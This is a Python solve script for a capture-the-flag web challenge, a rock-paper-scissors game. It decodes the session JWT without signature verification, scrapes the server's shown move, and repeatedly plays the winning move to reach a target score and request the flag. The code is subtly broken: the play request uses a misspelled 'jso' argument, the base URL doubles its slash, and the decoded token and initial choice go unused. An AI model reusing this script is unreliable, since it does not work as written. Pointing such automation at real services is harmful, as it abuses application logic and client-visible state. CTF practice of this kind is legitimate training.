import requests
import jwt
from bs4 import BeautifulSoup
import time

BASE_URL = 'https://rock-paper-scissors-eeb405317cfb5950.be.ax/'


def create_session(username):
    response = requests.post(f'{BASE_URL}/new', json={'username': username})
    if response.status_code == 200:
        print("Session created successfully")
        session_cookie = response.cookies.get('session')
        return session_cookie
    else:
        print("Failed to create session:", response.text)
        return None


def get_computer_choice():
    response = requests.get(f'{BASE_URL}/')
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        current_choice = soup.find(id='current').text
        return current_choice
    else:
        print("Failed to get the computer's choice:", response.text)
        return None


def simulate_wins(session_cookie, username, target_score):
    session_data = jwt.decode(session_cookie,
                              options={"verify_signature": False})
    headers = {'Authorization': f'Bearer {session_cookie}'}
    winning_choices = {'🪨': '📃', '📃': '✂️', '✂️': '🪨'}

    while True:
        initial_choice = get_computer_choice()
        time.sleep(0.1)
        computer_choice = get_computer_choice()
        if computer_choice:
            player_choice = winning_choices[computer_choice]

            start_time = time.time()
            response = requests.post(f'{BASE_URL}/play',
                                     jso={'position': player_choice},
                                     headers=headers)
            end_time = time.time()

            if response.status_code == 200:
                data = response.json()
                if data['state'] == 'win':
                    score = data['score']
                    print(
                        f"Win! Current score: {score} (Response time: {end_time - start_time}s)")
                    if score > target_score:
                        break
                    time.sleep(2)
                else:
                    print(f"Lost the game with score: {data['score']}")
                    break
            else:
                print("Failed to play the game:", response.text)
        else:
            print("Failed to retrieve computer's choice, retrying...")
            time.sleep(0.1)


def get_flag(session_cookie, username):
    headers = {'Authorization': f'Bearer {session_cookie}'}
    response = requests.get(f'{BASE_URL}/flag', headers=headers)
    if response.status_code == 200:
        print("Flag:", response.text)
    else:
        print("Failed to get flag:", response.text)


if __name__ == '__main__':
    USERNAME = 'CTFPlayer'
    TARGET_SCORE = 1337

    session_cookie = create_session(USERNAME)
    if session_cookie:
        simulate_wins(session_cookie, USERNAME, TARGET_SCORE)
        get_flag(session_cookie, USERNAME)
